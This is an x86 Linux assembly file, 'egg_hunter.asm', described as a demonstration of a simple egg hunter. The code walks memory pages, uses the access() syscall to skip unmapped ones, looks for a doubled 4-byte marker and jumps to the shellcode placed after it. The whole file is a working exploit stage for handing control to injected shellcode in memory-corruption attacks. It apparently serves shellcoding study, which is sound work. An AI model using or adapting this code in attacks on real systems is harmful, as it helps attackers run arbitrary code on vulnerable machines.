;; egg_hunter.asm
; Author: Mutti K
; Purpose: Demonstration of simple egg hunter.

global _start

section .text

_start:
    cld    
    xor    edx,edx ; clear
    xor    ecx,ecx ; clear
next_page:
    or     dx,0xfff ; Add page_size-1 to edx
next_loc:
    inc    edx ; Increment pointer
    lea    ebx,[edx+0x4]
    push   0x21 ; access() syscall
    pop    eax
    int    0x80 ; Interrupt
    cmp    al,0xf2 ; Check for EFAULT
    je next_page ; EFAULT raised, next page
    mov    eax,0x50905090 ; egg search value . Shellcode needs to have this egg prepended twice.
    mov    edi,edx ; edi needs memory address value in edx for scasd op.
    scasd   ; Compare EAX (egg) with doubleword at ES:(E)DI and set status flags and if a match is found then increment edi by 4
    jne next_loc ; Not found
    scasd   ; Look for second occurrance of egg_sig
    jne next_loc ; Not found
    jmp    edi ; Egg found so jump to start of real shellcode
